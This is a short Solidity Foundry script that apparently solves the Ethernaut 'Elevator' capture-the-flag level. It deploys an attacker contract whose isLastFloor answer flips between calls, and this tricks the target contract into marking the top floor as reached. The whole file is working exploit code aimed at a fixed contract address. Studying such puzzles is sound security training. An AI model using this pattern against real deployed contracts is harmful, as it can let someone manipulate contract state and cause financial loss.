// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import { Elevator } from "../src/Elevator.sol";

contract Attacker {

    Elevator public instance = Elevator(0x2A426e4F1f2808ac173090BF8Bb485F9e40f7bf2);
    bool called;

    function isLastFloor(uint256 floor) external returns (bool)
    {
        if (called || floor != floor)
            return true;
        called = true;
        return false;
    }

    function attack() external {
        instance.goTo(0);
    }

}

contract ElevatorSolver is Script {

    Elevator public instance = Elevator(0x2A426e4F1f2808ac173090BF8Bb485F9e40f7bf2);

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

    function run() external {
        vm.startBroadcast(prv);
        
        console.log("is top --->", instance.top());
        Attacker a = new Attacker();
        a.attack();
        console.log("is top --->", instance.top());

        vm.stopBroadcast();
    }

}

